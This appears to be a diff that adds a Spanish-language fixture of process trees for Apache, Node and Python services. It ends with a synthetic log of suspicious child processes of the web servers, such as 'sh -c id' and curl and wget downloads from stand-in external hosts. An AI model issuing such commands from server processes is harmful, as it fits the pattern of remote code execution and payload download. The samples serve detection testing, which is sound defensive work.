@@ -1,0 +1,23 @@
+== Árbol de procesos: web ==
+PID                 PPID                USER                COMMAND             COMMAND
+10595               10570               root                apache2             apache2 -DFOREGROUND
+10653               10595               www-data            apache2             apache2 -DFOREGROUND
+10654               10595               www-data            apache2             apache2 -DFOREGROUND
+10656               10595               www-data            apache2             apache2 -DFOREGROUND
+10659               10595               www-data            apache2             apache2 -DFOREGROUND
+10662               10595               www-data            apache2             apache2 -DFOREGROUND
+
+== Árbol de procesos: API ==
+PID                 PPID                USER                COMMAND             COMMAND
+10665               10636               tincho              node                node server.js
+44046               10636               tincho              node                node -e fetch('http://127.0.0.1:3000/').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))
+
+== Árbol de procesos: servicio interno ==
+PID                 PPID                USER                COMMAND             COMMAND
+10499               10474               nobody              python              python app.py
+
+== Hijos sospechosos en el log sintético ==
+2026-10-27T09:42:17Z host=web01 ppid=812 ppid_comm=apache2 pid=903 comm=sh args="sh -c id"
+2026-10-27T09:43:03Z host=api01 ppid=501 ppid_comm=node pid=601 comm=sh args="sh -c curl http://198.51.100.7/x"
+2026-10-27T09:44:22Z host=web01 ppid=812 ppid_comm=apache2 pid=906 comm=wget args="wget http://198.51.100.9/a"
+2026-10-27T09:45:10Z host=svc01 ppid=701 ppid_comm=python pid=704 comm=sh args="sh -c uname -a"
